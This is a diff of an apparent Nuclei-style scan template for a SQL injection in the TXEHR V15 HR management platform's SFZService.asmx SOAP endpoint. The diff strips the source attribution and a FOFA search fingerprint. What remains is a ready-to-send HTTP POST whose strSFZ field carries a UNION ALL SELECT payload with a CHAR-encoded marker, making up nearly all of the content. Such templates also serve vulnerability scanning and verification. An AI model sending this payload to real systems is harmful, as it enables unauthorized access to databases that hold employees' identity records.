@@ -3,12 +3,8 @@ info:
   name: 同享TXEHR V15人力管理管理平台SFZService.asmx存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/notzshgfg3cq1l8z'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: notzshgfg3cq1l8z
-    fofa: body="/Assistant/Default.aspx"
 http:
 - raw:
   - "POST /Service/SFZService.asmx HTTP/1.1\nHost: {{Hostname}}\nSOAPAction: [http://tempuri.org/GetEmployeeBySFZ](http://tempuri.org/GetEmployeeBySFZ)\nContent-Type: text/xml;charset=UTF-8\n\n<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"\\\n      \\ xmlns:tem=\\\"http://tempuri.org/\\\">\\n   <soapenv:Header/>\\n   <soapenv:Body>\\n\\\n      \\      <tem:GetEmployeeBySFZ>\\n         <!--type: string-->\\n         <tem:strSFZ>1'\\\n      \\ UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(107)+CHAR(122)+CHAR(122)+CHAR(113)+CHAR(81)+CHAR(78)+CHAR(79)+CHAR(122)+CHAR(106)+CHAR(69)+CHAR(103)+CHAR(80)+CHAR(87)+CHAR(89)+CHAR(117)+CHAR(97)+CHAR(104)+CHAR(105)+CHAR(74)+CHAR(109)+CHAR(80)+CHAR(68)+CHAR(74)+CHAR(98)+CHAR(122)+CHAR(99)+CHAR(103)+CHAR(90)+CHAR(68)+CHAR(105)+CHAR(114)+CHAR(107)+CHAR(69)+CHAR(86)+CHAR(121)+CHAR(76)+CHAR(69)+CHAR(115)+CHAR(102)+CHAR(81)+CHAR(76)+CHAR(105)+CHAR(101)+CHAR(74)+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--\\\n      \\ hExp</tem:strSFZ>\\n      </tem:GetEmployeeBySFZ>\\n   </soapenv:Body>\\n</soapenv:Envelope>"
